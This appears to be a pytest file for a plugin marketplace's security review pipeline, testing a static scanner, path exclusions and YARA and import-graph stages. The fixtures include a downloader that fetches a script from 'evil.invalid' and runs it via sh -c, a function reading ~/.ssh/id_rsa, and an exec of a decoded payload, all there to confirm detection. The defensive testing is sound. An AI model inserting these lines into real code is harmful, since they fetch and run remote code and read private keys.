from __future__ import annotations

import asyncio
import hashlib
import json
import logging
import zipfile
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

from app.artifacts.archive import (
    ArchivePrechecker,
    is_excluded_review_path,
    review_exclusion_reason,
)
from app.artifacts.diff import manifest_tree_sha256
from app.artifacts.import_graph import ImportGraphService
from app.artifacts.malware import (
    YaraRulesetSnapshot,
    YaraScanLimits,
    YaraScanResult,
    YaraScanStatus,
)
from app.artifacts.policy import review_policy_sha256
from app.artifacts.repository import InMemoryArtifactRepository
from app.artifacts.stages import StageContext, YaraStage
from app.artifacts.static_scan import RULESET_VERSION, StaticScanner
from app.artifacts.storage import LocalArtifactStorage, build_content_key
from app.config import load_settings
from app.store import InMemoryMarketStore
from test_artifact_pipeline import byte_stream, plugin_zip


def _scan_sources(
    tmp_path: Path,
    *,
    main_source: str = "def register():\n    return True\n",
    extra_files: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    archive_path = tmp_path / "plugin.zip"
    archive_path.write_bytes(plugin_zip(main_source=main_source, extra_files=extra_files))
    prechecked = ArchivePrechecker(load_settings({}).artifacts).inspect(
        archive_path,
        expected_repo="https://github.com/alice/astrbot_plugin_demo",
    )
    return StaticScanner().scan(str(archive_path), prechecked.members)


def test_review_path_exclusion_covers_tests_and_github_ci_only() -> None:
    assert review_exclusion_reason(".github/workflows/ci.yml") == "github_ci"
    assert review_exclusion_reason(".github/scripts/release.py") == "github_ci"
    assert review_exclusion_reason("tests/test_provider.py") == "test_file"
    assert review_exclusion_reason("pkg/tests/helpers.py") == "test_file"
    assert review_exclusion_reason("test/conftest.py") == "test_file"
    assert review_exclusion_reason("conftest.py") == "test_file"
    assert review_exclusion_reason("test_smoke.py") == "test_file"
    assert review_exclusion_reason("studio_test.py") == "test_file"
    assert review_exclusion_reason("web/studio.test.ts") == "test_file"

    assert is_excluded_review_path("main.py") is False
    assert is_excluded_review_path("metadata.yaml") is False
    assert is_excluded_review_path("tl/api/google.py") is False
    assert is_excluded_review_path("agentlymail/client.py") is False
    assert is_excluded_review_path("requirements.txt") is False


def test_static_scanner_eliminates_common_ai_plugin_false_positives(tmp_path: Path) -> None:
    benign_data_uri = "data:image/png;base64," + ("A" * 600)
    findings = _scan_sources(
        tmp_path,
        main_source=(
            '"""Retain a source locator, never URL credentials or ~/.ssh paths."""\n'
            "import base64\n"
            "import importlib\n"
            "import zlib\n"
            "from re import compile\n"
            "\n"
            "# Determine API key: from api_keys list or legacy api_key\n"
            "PATTERN = compile(r'^[a-z]+$')\n"
            "PLACEHOLDER_KEY = 'sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxx'\n"
            f"ICON = '{benign_data_uri}'\n"
            "\n"
            "def build_headers(config, bundle, info):\n"
            "    access_token: str = bundle.access_token\n"
            "    if not config.api_key:\n"
            "        raise ValueError('missing_credentials')\n"
            "    if not isinstance(info, dict) or not info.get('private_key'):\n"
            "        return {'status': 'invalid_credentials'}\n"
            "    return {\n"
            "        'Authorization': f'Bearer {access_token}',\n"
            "        'x-goog-api-key': config.api_key,\n"
            "    }\n"
            "\n"
            "def load_static_module(factory):\n"
            "    factory().eval()\n"
            "    mod = importlib.import_module('json')\n"
            "    helper = __import__('hashlib')\n"
            "    return mod, helper, zlib.decompress(base64.b64decode(b'eJwDAAAAAAE='))\n"
        ),
        extra_files={
            "tl/ffmpeg_helper.py": (
                "import httpx\n"
                "import subprocess\n"
                "def convert(src, dst):\n"
                "    _ = httpx.get('https://api.example.com/status')\n"
                "    return subprocess.run(['ffmpeg', '-i', src, dst], check=True)\n"
            ),
            "tests/test_studio_frontend.py": (
                "import subprocess\n"
                "def test_node():\n"
                "    exec(compile('x = 1', 't.py', 'exec'), {})\n"
                "    subprocess.run(['node', '-e', 'console.log(1)'], check=True)\n"
                "    secret_path = '~/.ssh/id_rsa'\n"
                "    return secret_path\n"
            ),
            ".github/scripts/release.py": (
                "import os\nos.system('echo release')\nKEY = 'ghp_1234567890abcdefghij1234567890'\n"
            ),
        },
    )

    assert all(not is_excluded_review_path(item["file_path"]) for item in findings)
    assert all(item["metadata"]["ruleset_version"] == RULESET_VERSION for item in findings)
    assert [(item["file_path"], item["rule_id"], item["severity"]) for item in findings] == [
        ("tl/ffmpeg_helper.py", "PY002", "high")
    ]


def test_static_scanner_preserves_true_security_detections(tmp_path: Path) -> None:
    real_github_token = "ghp_" + "AbCdEfGhIjKlMnOpQrStUvWx"
    encoded_blob = "A" * 520
    findings = _scan_sources(
        tmp_path,
        main_source=(
            "from pathlib import Path\n"
            "import importlib\n"
            "def steal(module_name):\n"
            "    key_path = Path.home() / '.ssh' / 'id_rsa'\n"
            f"    token = '{real_github_token}'\n"
            "    exec(compile('pass', 'x.py', 'exec'), {})\n"
            "    return key_path, token, importlib.import_module(module_name)\n"
        ),
        extra_files={
            "downloader.py": (
                "import requests\n"
                "from subprocess import run as sp_run\n"
                "def run_remote():\n"
                "    body = requests.get('https://evil.invalid/a.sh').text\n"
                "    sp_run(['sh', '-c', body], check=True)\n"
            ),
            "obfuscated.py": (
                "import base64\n"
                "import zlib\n"
                f"PAYLOAD = '{encoded_blob}'\n"
                "exec(zlib.decompress(base64.b64decode(PAYLOAD)))\n"
            ),
        },
    )

    by_rule = {(item["file_path"], item["rule_id"]): item for item in findings}
    assert ("main.py", "PY001") in by_rule
    assert (
        len(
            [
                item
                for item in findings
                if item["file_path"] == "main.py" and item["rule_id"] == "PY001"
            ]
        )
        == 1
    )
    assert ("main.py", "PY003") in by_rule
    assert ("main.py", "PY004") in by_rule
    assert ("main.py", "PY007") in by_rule
    assert ("downloader.py", "PY002") in by_rule
    assert by_rule[("downloader.py", "PY006")]["severity"] == "critical"
    assert by_rule[("obfuscated.py", "PY008")]["severity"] == "critical"
    assert real_github_token not in json.dumps(findings)


def test_import_graph_and_yara_exclude_tests_and_github_ci_files(tmp_path: Path) -> None:
    async def scenario() -> tuple[Any, list[str]]:
        store = InMemoryMarketStore()
        user = store.upsert_github_user({"id": "100", "login": "alice", "name": "Alice"})
        plugin = store.register_plugin(
            user,
            {
                "name": "astrbot_plugin_demo",
                "display_name": "Demo",
                "desc": "Demo",
                "author": "Alice",
                "repo": "https://github.com/alice/astrbot_plugin_demo",
                "tags": [],
                "category": "other",
            },
        )
        repository = InMemoryArtifactRepository(store)
        storage = LocalArtifactStorage(tmp_path / "storage", "https://cdn.example.test")
        archive_bytes = plugin_zip(
            main_source="from .helper import run\n",
            extra_files={
                "helper.py": "def run():\n    return 1\n",
                "tests/conftest.py": "import sys\nsys.path.insert(0, '.')\n",
                "tests/test_helper.py": "import importlib\nimportlib.import_module(name)\n",
                ".github/scripts/check.py": "import sys\nsys.path.append('/tmp')\n",
                ".github/workflows/ci.yml": "name: ci\n",
            },
        )
        stored = await storage.put_quarantine(
            byte_stream(archive_bytes), "quarantine/art-1.zip", 10 * 1024 * 1024
        )
        policy_payload = {
            "schema_version": "1",
            "required_stages": ["static", "diff", "import_graph", "yara", "runtime"],
            "runtime_targets": [{"astrbot": "4.28.2", "python": "3.12"}],
            "limits": {"cpu": 1, "memory_mb": 768, "pids": 128, "timeout_seconds": 120},
            "network_profiles": {"install": "pypi-only-v1", "smoke": "none"},
            "llm": {"enabled": False},
            "malware": {"clamav": False, "yara_ruleset": "yara-test-v1"},
            "dependency": {"enabled": False},
            "routing": {"auto_approve": True},
        }
        policy = await repository.create_review_policy(
            {
                "version": "p-test-v1",
                "schema_version": "1",
                "status": "active",
                "is_default": True,
                "policy": policy_payload,
                "policy_sha256": review_policy_sha256(policy_payload),
            }
        )
        artifact = await repository.create_artifact(
            {
                "id": "art_excl_1",
                "plugin_id": plugin["id"],
                "source_type": "upload",
                "source_repo": plugin["repo"],
                "archive_sha256": stored.sha256,
                "size_bytes": stored.size_bytes,
                "quarantine_key": "quarantine/art-1.zip",
                "submitted_by": user["id"],
                "policy_version_id": policy["id"],
            }
        )
        await repository.transition_review_status(artifact["id"], "prechecking")
        artifact = await repository.transition_review_status(artifact["id"], "scanning")
        assert artifact is not None

        archive_path = tmp_path / "source.zip"
        archive_path.write_bytes(archive_bytes)
        prechecked = ArchivePrechecker(load_settings({}).artifacts).inspect(
            archive_path,
            expected_repo=plugin["repo"],
        )
        manifests = []
        for member in prechecked.members:
            file_id = (
                "file_"
                + hashlib.sha256(f"{artifact['id']}\x00{member.path}".encode()).hexdigest()[:32]
            )
            content_key = build_content_key(artifact["id"], file_id)
            with zipfile.ZipFile(archive_path) as zf:
                data = zf.read(member.source_name)
            await storage.put_text_content(content_key, data)
            manifest = member.as_manifest(content_key=content_key)
            manifest.update({"id": file_id, "flags": {"source_name": member.source_name}})
            manifests.append(manifest)

        tree_sha = manifest_tree_sha256(manifests)
        await repository.update_artifact_manifest(
            artifact["id"],
            version=prechecked.version,
            normalized_version=prechecked.normalized_version,
            tree_sha256=tree_sha,
        )
        await repository.replace_artifact_files(artifact["id"], manifests, tree_sha)
        artifact = await repository.get_artifact(artifact["id"])
        assert artifact is not None

        graph_result = await ImportGraphService().build(
            artifact=artifact,
            repository=repository,
            storage=storage,
            entrypoint_paths={"main.py"},
        )

        scanned_paths: list[str] = []
        ruleset = YaraRulesetSnapshot(
            version="yara-test-v1",
            source="unit-test",
            content_sha256="b" * 64,
            activated_at=datetime(2026, 11, 22, tzinfo=UTC),
            content=b"rule noop { condition: false }\n",
        )

        class RecordingYaraScanner:
            name = "yara"
            version = "yara-subprocess-v1"
            ready = True
            unavailable_reason = ""

            def __init__(self) -> None:
                self.ruleset = ruleset

            async def scan(
                self,
                archive_path: Path,
                members: tuple[Any, ...],
                limits: YaraScanLimits,
                *,
                expected_sha256: str,
                expected_size_bytes: int,
            ) -> YaraScanResult:
                del archive_path, limits, expected_size_bytes
                scanned_paths.extend(member.path for member in members)
                return YaraScanResult(
                    status=YaraScanStatus.NO_MATCH,
                    ruleset_version=ruleset.version,
                    ruleset_sha256=ruleset.content_sha256,
                    ruleset_source=ruleset.source,
                    ruleset_activated_at=ruleset.activated_at,
                    target_sha256=expected_sha256,
                    engine_version="yara-4.5",
                    scanned_files=len(members),
                    scanned_bytes=sum(member.size_bytes for member in members),
                )

        stage = YaraStage(RecordingYaraScanner())
        context = StageContext.create(
            artifact=artifact,
            job={
                "id": "job-yara-1",
                "attempts": 1,
                "policy_version_id": policy["id"],
                "lease_owner": "worker-1",
                "payload": {
                    "stage": "yara",
                    "tool_version": "yara-subprocess-v1",
                    "artifact_sha256": artifact["archive_sha256"],
                    "input_sha256": "c" * 64,
                },
            },
            policy=policy,
            repository=repository,
            storage=storage,
            tools={},
            logger=logging.getLogger("test"),
        )
        outcome = await stage.execute(context)
        assert outcome.kind.value == "completed"
        return graph_result, scanned_paths

    graph_result, scanned_paths = asyncio.run(scenario())

    assert graph_result.coverage["complete"] is True
    assert graph_result.coverage["reasons"] == []
    assert graph_result.coverage["python_files"] == 2
    assert "tests/test_helper.py" not in graph_result.coverage["review_paths"]
    assert ".github/scripts/check.py" not in graph_result.coverage["review_paths"]
    assert sorted(scanned_paths) == ["README.md", "helper.py", "main.py", "metadata.yaml"]
